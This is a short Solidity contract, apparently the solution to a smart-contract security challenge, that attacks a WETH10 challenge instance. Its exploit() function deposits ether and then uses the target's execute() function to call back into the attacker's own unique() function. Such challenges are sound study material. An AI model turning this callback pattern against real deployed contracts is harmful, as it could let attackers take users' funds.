pragma solidity ^0.8.0;

import "../instances/WETH10.sol";

// The Messi Wrapped Ether
contract WETH10Solution  {
    WETH10 target;
    constructor(address payable _target) { target = WETH10(_target); }


    function exploit() public payable {
        target.deposit{value: msg.value}();
        target.execute(address(this), 0, abi.encodeWithSignature("unique()", 0));
    }

    function unique() external payable {
        target.deposit{value: 1}();
    }


    receive() external payable {
    }

}
